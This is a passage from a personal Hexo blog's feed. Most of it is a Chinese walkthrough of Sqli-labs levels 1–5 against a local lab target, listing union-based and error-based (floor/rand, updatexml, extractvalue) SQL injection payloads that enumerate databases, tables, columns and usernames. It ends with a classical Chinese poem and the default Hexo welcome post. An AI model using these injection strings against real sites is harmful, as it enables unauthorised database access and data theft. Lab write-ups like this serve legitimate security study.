false。</p><p>UNION的作用是将两个select查询结果合并，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了，然后我们就得到了显示位。</p></blockquote><p>上面这段仍看不懂可细看这个博客,参考链接：<a href="https://blog.csdn.net/weixin_42277564/java/article/details/80583959" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/java/article/details/80583959</a></p><p>Union 后面的select 什么用？select 1,2,3…如果没有指向某个表，那么它意味着输出1,2,3。</p><p><a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">select参考博客</a></p><p><strong>问题4：那为什么order by 前面的id不用等于-1就可以执行？</strong></p><p>答：因为order by 用不着执行到下面。</p><h4 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h4><p>（意为有效载荷，简单说就是对于接收者有用的数据；因为前面我们查到有两个位置可以在页面上显示，所以我们就可以利用这两个位置来得到我们想要的信息）</p><p><a href="https://www.cnblogs.com/jiersixi/p/11784769.html" target="_blank" rel="noopener">payload的一些知识的参考博客</a></p><p>1)输入?id=-1’union select 1,database(),3 –+ 注当前数据库名</p><p><img src="/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210135523.png" alt="image-20200513210135523"></p><p>2)输入?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 注表名</p><p>（备注：information_schema数据库是mysql自带的，【INFORMATION_SCHEMA 数据库】 是MySQL自带的，它提供了访问数据库 元数据 的方式。什么是 元数据 呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p><p>在MySQL中，把【INFORMATION_SCHEMA】 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p>在 【INFORMATION_SCHEMA 】中，有数个 只读 表。它们实际上是 视图 ，而不是基本表，因此，你将无法看到与之相关的任何文件。</p><p><a href="http://www.luyixian.cn/news_show_9165.aspx" target="_blank" rel="noopener">http://www.luyixian.cn/news_show_9165.aspx</a></p><p>（table_schema即数据表所属的数据库名）</p><p><img src="/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210321131.png" alt="image-20200513210321131"></p><p>3)输入?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+注某张表的字段，这里以users为例</p><p>（Table_name：表名称）</p><p><img src="/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210339398.png" alt="image-20200513210339398"></p><p>4）输入?id=-1’ union select 1,group_concat(username),3 from security.users –+注字段的值，这里注 users 表里的 usrname 字段为例</p><p><img src="/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210359537.png" alt="image-20200513210359537"></p><p>【备注：</p><p>1）函数database（）返回当前数据库名</p><p>2）字段名即table_schema等的参考链接：<a href="https://www.cnblogs.com/shoshana-kong/p/10979295.html" target="_blank" rel="noopener">简单版</a>     <a href="https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html" target="_blank" rel="noopener">详细版</a></p><p>3）group_concat(name,sex)结果：左边显示组名，右边想显示该组别下的所有成员信息。</p><p>因为group_concat函数可以一次性查出所有信息，所以用它。</p><p>group_concat函数的用法的参考链接：<a href="https://www.cnblogs.com/baizhanshi/p/10918711.html" target="_blank" rel="noopener">https://www.cnblogs.com/baizhanshi/p/10918711.html</a>】</p><p>参考链接1 ：<a href="https://www.jianshu.com/p/ac546306f1e8" target="_blank" rel="noopener"> https://www.jianshu.com/p/ac546306f1e8</a></p><p>参考链接2：<a href="http://www.secist.com/archives/4880.html" target="_blank" rel="noopener">  http://www.secist.com/archives/4880.html</a></p><h2 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h2><p>1.判断字符型还是数字型 得数字型</p><p>2.猜字段order by</p><p>3.联合查询union select</p><p>4.payload：去掉’输入得结果，均与第一题一样。</p><h2 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h2><h4 id="1-判断字符型还是数字型"><a href="#1-判断字符型还是数字型" class="headerlink" title="1.判断字符型还是数字型"></a>1.判断字符型还是数字型</h4><p>输入?id=1’报错发现有个)</p><p>跟第一题进行对比后发现，此题id格式应为id=(‘1’)。</p><p><strong>【</strong>做题的时候输入法忘记改了，为中文，然后我发现id等号后面输入中文单引号，括号为中文或英文的时候都没有报错，我就很奇怪，后来想一下可能之所以中文单引号没报错是因为他没把它当单引号】</p><p>第一题为基于错误的GET单引号字符型注入，第三题为基于错误的GET单引号变形字符型注入。</p><h4 id="2-猜字段order-by"><a href="#2-猜字段order-by" class="headerlink" title="2.猜字段order by"></a>2.猜字段order by</h4><p>输入?id=1’) order by 4–+ 得字段为3</p><h4 id="3-联合查询注入"><a href="#3-联合查询注入" class="headerlink" title="3.联合查询注入"></a>3.联合查询注入</h4><p>输入?id=-1’) union select 1,2,3–+</p><h4 id="4-payload-1"><a href="#4-payload-1" class="headerlink" title="4.payload"></a>4.payload</h4><p>输入?id=-1’) union select 1,database(),3–+</p><p>输入?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</p><p>输入?id=-1’) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p><p>输入?id=-1’) union select 1,group_concat(username),3 from security.users–+</p><h2 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h2><p>1.判断整型或字符型 </p><p>得基于错误的GET双引号字符型注入，故除了需要把 ’) 改成 ”) 其他均跟上文一样。</p><p>2.猜字段 order by</p><p>3.联合查询注入</p><p>4.payload</p><h2 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h2><h4 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h4><p>输入?id=1没错，输入?id=1’报错</p><p>这道题没有显示位，所以得用双查询报错注入</p><p>双查询注入详解参考的链接：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a></p><blockquote><p>归纳：</p><p>1）查询数据库名：</p><p>select count(<em>), concat((select database()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>2）查询版本：</p><p>select count(<em>), concat((select version()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>3）查询用户名：</p><p>select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>4）查询派生表：</p><p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p></blockquote><h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入<code>?id=-1&#39; union select 1,count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到数据库名</p><p>2）输入<code>?id=-1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到表名</p><p>3）输入<code>?id=-1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到users表的字段</p><p>4）输入<code>?id=-1&#39; union select 1,count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;--+</code> 得到users表的username字段的值</p><p><strong>问题6</strong>：可是明明就没有爆出users这个表名，只得到referers,怎么才能看到所有的表名呢？</p><p>答：会对此产生疑问是因为没有理解limit（1,1）；LIMIT m,n指从第m+1条开始，取n条。该题只能显示一条，所以n=2的时候会报错。当m=3的时候出来的表名就是users。</p><h2 id="报错的类型："><a href="#报错的类型：" class="headerlink" title="报错的类型："></a>报错的类型：</h2><p>参考博客：<a href="https://blog.csdn.net/weixin_42277564/article/details/80635586" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/article/details/80635586</a></p><blockquote><p>1.通过floor报错<br>     and (select 1 from (select count(<em>),concat((payload),floor (rand(0)</em>2))x     from information_schema.tables group by x)a)<br>     其中payload为你要插入的SQL语句<br>     需要注意的是该语句将     输出字符长度限制为64个字符</p><p>注：输出字符长度限制为64个字符payload填sql语句如查询当前数据库</p><p><a href="http://127.0.0.1/sql/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select 1 from (select </p><p>count(<em>),concat((database()),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p><p>2.通过updatexml报错<br>     and updatexml(1,payload,1)</p><p>and updatexml(1,concat(0x7e,@@version,0x7e),1)</p><p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br> 并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><p>3.通过ExtractValue报错</p><p>and extractvalue(1, payload)</p><p>and extractvalue(1, concat(0x7e,@@version,0x7e))<br> 输出字符有长度限制，最长32位。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sqli-labs（1-5关）&quot;&gt;&lt;a href=&quot;#Sqli-labs（1-5关）&quot; class=&quot;headerlink&quot; title=&quot;Sqli-labs（1-5关）&quot;&gt;&lt;/a&gt;Sqli-labs（1-5关）&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://b
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>我的第一篇博客</title>
    <link href="http://yoursite.com/2020/05/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2020/05/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
    <published>2020-05-13T17:01:23.636Z</published>
    <updated>2020-07-06T15:06:37.648Z</updated>
    
    <content type="html"><![CDATA[<p>  太常引·建康中秋夜为吕叔潜赋</p><p>​                      [宋]辛弃疾</p><p>​    一轮秋影转金波。飞镜又重磨。</p><p>​    把酒问姮娥。被白发、欺人奈何。 </p><p>​    乘风好去，长空万里，直下看山河。</p><p>​    斫去桂婆娑。人道是、清光更多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;  太常引·建康中秋夜为吕叔潜赋&lt;/p&gt;
&lt;p&gt;​                      [宋]辛弃疾&lt;/p&gt;
&lt;p&gt;​    一轮秋影转金波。飞镜又重磨。&lt;/p&gt;
&lt;p&gt;​    把酒问姮娥。被白发、欺人奈何。 &lt;/p&gt;
&lt;p&gt;​    乘风好去，长空万里，直下看山河
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/03/16/hello-world/"/>
    <id>http://yoursite.com/2020/03/16/hello-world/</id>
    <published>2020-03-16T05:54:19.458Z</published>
    <updated>2020-03-16T05:54:19.458Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
